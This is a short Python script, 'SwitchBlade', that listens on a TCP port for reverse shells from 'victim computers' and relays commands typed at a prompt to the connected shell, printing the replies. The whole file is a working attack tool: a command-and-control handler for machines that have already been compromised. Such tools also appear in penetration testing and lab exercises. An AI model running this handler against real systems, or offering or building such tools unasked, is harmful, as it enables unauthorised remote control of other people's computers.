#!/bin/env python3
# SwitchBlade - a python based TCP/IP handler for remote connections
# It's not as versitile as the Swiss-Army knife, but it's real good for stabbin'
# Author: Connor Gannon (Gin&Miskatonic)
# Init Date: 14 Nov 2018
#
import sys
import os
import argparse
import socket

import nclib
from prompt_toolkit import PromptSession

from nclib.errors import NetcatError, NetcatTimeout

def runCommand(cmd):
	print(cmd)
	proc = nclib.Process(cmd.split(' ')[0])
	proc.send(str.encode(' '.join(cmd.split(' ')[1:])))
# can add support for piping here by writing a for loop that uses these connections to bounce data from one command to the next
	output = proc.recv().decode()
	proc.close()
	return output

def listener(args):
	port = args.p
	sendLog = args.send_log
	recvLog = args.recv_log
	nc = nclib.Netcat(listen=('0.0.0.0',port), log_send=sendLog, log_recv=recvLog)
	print ("Victim connected! Session starting...")
	session = PromptSession()
	while True:
		try:
			cmd = session.prompt("$")
			if cmd == "bye netcat":
				break
			if cmd.split(':')[0] == 'cmd':
				cmd = runCommand(':'.join(cmd.split(':')[1:]))
			cmd = cmd+'\n'
			nc.send(str.encode(cmd))
			msg = nc.recv().decode().strip()
			print(msg)
		except (socket.error, NetcatError):
			print("Netcat machine broke.")
			break
	nc.close()

def main():
	parser=argparse.ArgumentParser(description='A smart handler to catch reverse shells from victim computers.')
	parser.add_argument('-p', default=443, type=int, required=False, help="The port on which switchblade will listen")
	parser.add_argument('--send-log', type=str, required=False, help="A filepath to log connection information about output")
	parser.add_argument('--recv-log', type=str, required=False, help="A filepath to log information about input")
	args = parser.parse_args(sys.argv[1:])
	listener(args)
	

if __name__=="__main__":
	main()
